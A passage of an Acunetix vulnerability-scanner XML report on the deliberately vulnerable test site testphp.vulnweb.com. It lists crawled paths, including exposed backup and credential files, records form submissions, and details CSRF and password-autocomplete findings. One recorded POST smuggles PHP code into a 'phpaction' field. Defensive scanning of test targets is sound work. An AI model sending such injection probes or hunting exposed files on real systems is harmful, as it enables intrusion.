      <URL>/secured/</URL>
      <FullURL>http://testphp.vulnweb.com/secured/</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="49">
      <Name>newuser.php</Name>
      <URL>/secured/newuser.php</URL>
      <FullURL>http://testphp.vulnweb.com/secured/newuser.php</FullURL>
      <Inputs>
       <Variable Name="" Type="URL encoded POST">
       </Variable>
       <Variable Name="uaddress" Type="URL encoded POST">
       </Variable>
       <Variable Name="ucc" Type="URL encoded POST">
       </Variable>
       <Variable Name="uemail" Type="URL encoded POST">
       </Variable>
       <Variable Name="upass" Type="URL encoded POST">
       </Variable>
       <Variable Name="upass2" Type="URL encoded POST">
       </Variable>
       <Variable Name="uphone" Type="URL encoded POST">
       </Variable>
       <Variable Name="urname" Type="URL encoded POST">
       </Variable>
       <Variable Name="uuname" Type="URL encoded POST">
       </Variable>
      </Inputs>
      <Variations>
        <Variation>
         <URL>http://testphp.vulnweb.com/secured/newuser.php</URL>
         <PostData><![CDATA[signup=signup&amp;uaddress=3137%20Laguna%20Street&amp;ucc=4111111111111111&amp;uemail=sample%40email.tst&amp;upass=g00dPa%24%24w0rD&amp;upass2=g00dPa%24%24w0rD&amp;uphone=555-666-0606&amp;urname=fpsryfqe&amp;uuname=muibkdui]]></PostData>
        </Variation>
      </Variations>
     </SiteFile>
     <SiteFile id="50">
      <Name>style.css</Name>
      <URL>/secured/style.css</URL>
      <FullURL>http://testphp.vulnweb.com/secured/style.css</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="51">
      <Name>comment.php</Name>
      <URL>/comment.php</URL>
      <FullURL>http://testphp.vulnweb.com/comment.php</FullURL>
      <Inputs>
       <Variable Name="aid" Type="URL encoded GET">
       </Variable>
       <Variable Name="" Type="URL encoded POST">
       </Variable>
       <Variable Name="comment" Type="URL encoded POST">
       </Variable>
       <Variable Name="name" Type="URL encoded POST">
       </Variable>
       <Variable Name="phpaction" Type="URL encoded POST">
       </Variable>
       <Variable Name="pid" Type="URL encoded GET">
       </Variable>
      </Inputs>
      <Variations>
        <Variation>
         <URL>http://testphp.vulnweb.com/comment.php?aid=3</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/comment.php</URL>
         <PostData><![CDATA[Submit=Submit&amp;comment=1&amp;name=&lt;your%20name%20here&gt;&amp;phpaction=echo%20%24_POST[comment];]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/comment.php?aid=1</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/comment.php?aid=2</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/comment.php?pid=7</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/comment.php?pid=1</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/comment.php?pid=2</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
      </Variations>
     </SiteFile>
     <SiteFile id="52">
      <Name>pictures</Name>
      <URL>/pictures/</URL>
      <FullURL>http://testphp.vulnweb.com/pictures/</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="53">
      <Name>8.jpg.tn</Name>
      <URL>/pictures/8.jpg.tn</URL>
      <FullURL>http://testphp.vulnweb.com/pictures/8.jpg.tn</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="54">
      <Name>1.jpg.tn</Name>
      <URL>/pictures/1.jpg.tn</URL>
      <FullURL>http://testphp.vulnweb.com/pictures/1.jpg.tn</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="55">
      <Name>7.jpg.tn</Name>
      <URL>/pictures/7.jpg.tn</URL>
      <FullURL>http://testphp.vulnweb.com/pictures/7.jpg.tn</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="56">
      <Name>6.jpg.tn</Name>
      <URL>/pictures/6.jpg.tn</URL>
      <FullURL>http://testphp.vulnweb.com/pictures/6.jpg.tn</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="57">
      <Name>4.jpg.tn</Name>
      <URL>/pictures/4.jpg.tn</URL>
      <FullURL>http://testphp.vulnweb.com/pictures/4.jpg.tn</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="58">
      <Name>3.jpg.tn</Name>
      <URL>/pictures/3.jpg.tn</URL>
      <FullURL>http://testphp.vulnweb.com/pictures/3.jpg.tn</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="59">
      <Name>5.jpg.tn</Name>
      <URL>/pictures/5.jpg.tn</URL>
      <FullURL>http://testphp.vulnweb.com/pictures/5.jpg.tn</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="60">
      <Name>2.jpg.tn</Name>
      <URL>/pictures/2.jpg.tn</URL>
      <FullURL>http://testphp.vulnweb.com/pictures/2.jpg.tn</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="61">
      <Name>WS_FTP.LOG</Name>
      <URL>/pictures/WS_FTP.LOG</URL>
      <FullURL>http://testphp.vulnweb.com/pictures/WS_FTP.LOG</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="62">
      <Name>wp-config.bak</Name>
      <URL>/pictures/wp-config.bak</URL>
      <FullURL>http://testphp.vulnweb.com/pictures/wp-config.bak</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="63">
      <Name>ipaddresses.txt</Name>
      <URL>/pictures/ipaddresses.txt</URL>
      <FullURL>http://testphp.vulnweb.com/pictures/ipaddresses.txt</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="64">
      <Name>credentials.txt</Name>
      <URL>/pictures/credentials.txt</URL>
      <FullURL>http://testphp.vulnweb.com/pictures/credentials.txt</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="65">
      <Name>path-disclosure-win.html</Name>
      <URL>/pictures/path-disclosure-win.html</URL>
      <FullURL>http://testphp.vulnweb.com/pictures/path-disclosure-win.html</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="66">
      <Name>path-disclosure-unix.html</Name>
      <URL>/pictures/path-disclosure-unix.html</URL>
      <FullURL>http://testphp.vulnweb.com/pictures/path-disclosure-unix.html</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="67">
      <Name>index.bak</Name>
      <URL>/index.bak</URL>
      <FullURL>http://testphp.vulnweb.com/index.bak</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="68">
      <Name>_mmServerScripts</Name>
      <URL>/_mmServerScripts/</URL>
      <FullURL>http://testphp.vulnweb.com/_mmServerScripts/</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="69">
      <Name>MMHTTPDB.php</Name>
      <URL>/_mmServerScripts/MMHTTPDB.php</URL>
      <FullURL>http://testphp.vulnweb.com/_mmServerScripts/MMHTTPDB.php</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="70">
      <Name>mysql.php</Name>
      <URL>/_mmServerScripts/mysql.php</URL>
      <FullURL>http://testphp.vulnweb.com/_mmServerScripts/mysql.php</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="71">
      <Name>.idea</Name>
      <URL>/.idea/</URL>
      <FullURL>http://testphp.vulnweb.com/.idea/</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="72">
      <Name>workspace.xml</Name>
      <URL>/.idea/workspace.xml</URL>
      <FullURL>http://testphp.vulnweb.com/.idea/workspace.xml</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="73">
      <Name>vcs.xml</Name>
      <URL>/.idea/vcs.xml</URL>
      <FullURL>http://testphp.vulnweb.com/.idea/vcs.xml</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="74">
      <Name>scopes</Name>
      <URL>/.idea/scopes/</URL>
      <FullURL>http://testphp.vulnweb.com/.idea/scopes/</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="75">
      <Name>scope_settings.xml</Name>
      <URL>/.idea/scopes/scope_settings.xml</URL>
      <FullURL>http://testphp.vulnweb.com/.idea/scopes/scope_settings.xml</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="76">
      <Name>acuart.iml</Name>
      <URL>/.idea/acuart.iml</URL>
      <FullURL>http://testphp.vulnweb.com/.idea/acuart.iml</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="77">
      <Name>misc.xml</Name>
      <URL>/.idea/misc.xml</URL>
      <FullURL>http://testphp.vulnweb.com/.idea/misc.xml</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="78">
      <Name>modules.xml</Name>
      <URL>/.idea/modules.xml</URL>
      <FullURL>http://testphp.vulnweb.com/.idea/modules.xml</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="79">
      <Name>encodings.xml</Name>
      <URL>/.idea/encodings.xml</URL>
      <FullURL>http://testphp.vulnweb.com/.idea/encodings.xml</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="80">
      <Name>admin</Name>
      <URL>/admin/</URL>
      <FullURL>http://testphp.vulnweb.com/admin/</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="81">
      <Name>create.sql</Name>
      <URL>/admin/create.sql</URL>
      <FullURL>http://testphp.vulnweb.com/admin/create.sql</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="82">
      <Name>CVS</Name>
      <URL>/CVS/</URL>
      <FullURL>http://testphp.vulnweb.com/CVS/</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="83">
      <Name>Root</Name>
      <URL>/CVS/Root</URL>
      <FullURL>http://testphp.vulnweb.com/CVS/Root</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="84">
      <Name>Entries</Name>
      <URL>/CVS/Entries</URL>
      <FullURL>http://testphp.vulnweb.com/CVS/Entries</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="85">
      <Name>Repository</Name>
      <URL>/CVS/Repository</URL>
      <FullURL>http://testphp.vulnweb.com/CVS/Repository</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="86">
      <Name>Entries.Log</Name>
      <URL>/CVS/Entries.Log</URL>
      <FullURL>http://testphp.vulnweb.com/CVS/Entries.Log</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="87">
      <Name>medias</Name>
      <URL>/medias</URL>
      <FullURL>http://testphp.vulnweb.com/medias</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="88">
      <Name>img</Name>
      <URL>/medias/img</URL>
      <FullURL>http://testphp.vulnweb.com/medias/img</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="89">
      <Name>css</Name>
      <URL>/medias/css</URL>
      <FullURL>http://testphp.vulnweb.com/medias/css</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="90">
      <Name>main.css</Name>
      <URL>/medias/css/main.css</URL>
      <FullURL>http://testphp.vulnweb.com/medias/css/main.css</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="91">
      <Name>js</Name>
      <URL>/medias/js</URL>
      <FullURL>http://testphp.vulnweb.com/medias/js</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="92">
      <Name>common_functions.js</Name>
      <URL>/medias/js/common_functions.js</URL>
      <FullURL>http://testphp.vulnweb.com/medias/js/common_functions.js</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
   </SiteFiles>
  </Crawler>
    <ReportItems>

      <ReportItem id="0" color="orange">
       <Name><![CDATA[HTML form without CSRF protection]]></Name>
       <ModuleName><![CDATA[Crawler]]></ModuleName>
       <Details><![CDATA[Form name: <font color="navy">&lt;empty&gt;</font><br/>Form action: <font color="navy">http://testphp.vulnweb.com/search.php?test=query</font><br/>Form method: <font color="navy">POST</font><br/><br/>Form inputs:<br/><ul><li>searchFor [Text]</li><li>goButton [Submit]</li></ul>]]></Details>
       <Affects><![CDATA[/]]></Affects>
       <Parameter><![CDATA[Unnamed Form]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Informational]]></Type>
       <Impact><![CDATA[An attacker may force the users of a web application to execute actions of the attacker''s choosing. A successful CSRF exploit can compromise end user data and operation in case of normal user. If the targeted end user is the administrator account, this can compromise the entire web application.]]></Impact>
       <Description><![CDATA[ <div class="coolbox"><font color="dark">This alert may be a false positive, manual confirmation is required.</font></div><br/>
Cross-site request forgery, also known as a one-click attack or session riding and abbreviated as CSRF or XSRF, is a type of malicious exploit of a website whereby unauthorized commands are transmitted from a user that the website trusts.

<br/><br/>Acunetix WVS found a HTML form with no apparent CSRF protection implemented. Consult details for more information about the affected HTML form.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Check if this form requires CSRF protection and implement CSRF countermeasures if necessary.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET / HTTP/1.1
Pragma: no-cache
Cache-Control: no-cache
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:49:49 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 4096
]]></Response>
       </TechnicalDetails>
       <CWE id="352"><![CDATA[CWE-352]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:H/Au:N/C:N/I:P/A:N]]></Descriptor>
          <Score><![CDATA[2.6]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[High]]></AC>
          <ACdesc><![CDATA[Specialized access conditions exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no impact to the confidentiality of the system.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N]]></Descriptor>
          <Score><![CDATA[4.3]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[Required]]></UI>
          <UIdesc><![CDATA[Successful exploitation of this vulnerability requires a user to take some action before the vulnerability can be exploited.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no loss of confidentiality within the impacted component.]]></Cdesc>
          <I><![CDATA[Low]]></I>
          <Idesc><![CDATA[Modification of data is possible, but the attacker does not have control over the consequence of a modification, or the amount of modification is constrained. The data modification does not have a direct, serious impact on the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
      <References></References>
      </ReportItem>

      <ReportItem id="1" color="green">
       <Name><![CDATA[Password type input with auto-complete enabled]]></Name>
       <ModuleName><![CDATA[Crawler]]></ModuleName>
       <Details><![CDATA[Password type input(s): <b>pass</b> from form named <b>loginform</b> with action <b>userinfo.php</b> have autocomplete enabled.]]></Details>
       <Affects><![CDATA[/login.php]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[info]]></Severity>
       <Type><![CDATA[Informational]]></Type>
       <Impact><![CDATA[Possible sensitive information disclosure.]]></Impact>
       <Description><![CDATA[When a new name and password is entered in a form and the form is submitted, the browser asks if the password should be saved.Thereafter when the form is displayed, the name and password are filled in automatically or are completed as the name is entered. An attacker with local access could obtain the cleartext password from the browser cache.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[The password auto-complete should be disabled in sensitive applications. <br/>To disable auto-complete, you may use a code similar to: <pre wrap="virtual"><code>&lt;INPUT TYPE=&quot;password&quot; AUTOCOMPLETE=&quot;off&quot;&gt;</code></pre>]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /login.php HTTP/1.1
Pragma: no-cache
Cache-Control: no-cache
Referer: http://testphp.vulnweb.com/
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:49:50 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 4671
]]></Response>
       </TechnicalDetails>
       <CWE id="200"><![CDATA[CWE-200]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:N/I:N/A:N]]></Descriptor>
          <Score><![CDATA[0.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no impact to the confidentiality of the system.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N]]></Descriptor>
          <Score><![CDATA[7.5]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no loss of integrity within the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
      <References></References>
      </ReportItem>

      <ReportItem id="2" color="green">
       <Name><![CDATA[Password type input with auto-complete enabled]]></Name>
       <ModuleName><![CDATA[Crawler]]></ModuleName>
       <Details><![CDATA[Password type input(s): <b>pass</b> from <b>unnamed form</b> with action <b>search.php?test=query</b> have autocomplete enabled.]]></Details>
       <Affects><![CDATA[/login.php]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[info]]></Severity>
       <Type><![CDATA[Informational]]></Type>
       <Impact><![CDATA[Possible sensitive information disclosure.]]></Impact>
       <Description><![CDATA[When a new name and password is entered in a form and the form is submitted, the browser asks if the password should be saved.Thereafter when the form is displayed, the name and password are filled in automatically or are completed as the name is entered. An attacker with local access could obtain the cleartext password from the browser cache.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[The password auto-complete should be disabled in sensitive applications. <br/>To disable auto-complete, you may use a code similar to: <pre wrap="virtual"><code>&lt;INPUT TYPE=&quot;password&quot; AUTOCOMPLETE=&quot;off&quot;&gt;</code></pre>]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /login.php HTTP/1.1
Pragma: no-cache
Cache-Control: no-cache
Referer: http://testphp.vulnweb.com/
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:49:50 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 4671
]]></Response>
       </TechnicalDetails>
       <CWE id="200"><![CDATA[CWE-200]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:N/I:N/A:N]]></Descriptor>
          <Score><![CDATA[0.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no impact to the confidentiality of the system.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N]]></Descriptor>
          <Score><![CDATA[7.5]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no loss of integrity within the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
